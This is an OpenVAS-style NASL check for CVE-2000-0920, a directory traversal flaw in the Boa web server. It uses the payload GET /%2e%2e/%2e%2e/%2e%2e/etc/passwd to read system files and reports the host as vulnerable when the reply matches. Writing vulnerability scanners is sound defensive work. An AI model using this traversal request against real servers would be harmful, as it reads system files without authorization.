if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10527" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 1770 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2000-0920" );
	script_name( "Boa file retrieval" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2000 Thomas Reinke" );
	script_family( "Remote file access" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_mandatory_keys( "Boa/banner" );
	script_tag( name: "solution", value: "Upgrade to a latest version of the server." );
	script_tag( name: "summary", value: "The remote Boa server allows an attacker to read arbitrary files
  on the remote web server, prefixing the pathname of the file with hex-encoded ../../..

  Example:

  GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd

  will return /etc/passwd." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.boa.org" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = NASLString( "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/" + file );
	req = http_get( item: url, port: port );
	res = http_send_recv( port: port, data: req );
	if(egrep( string: res, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

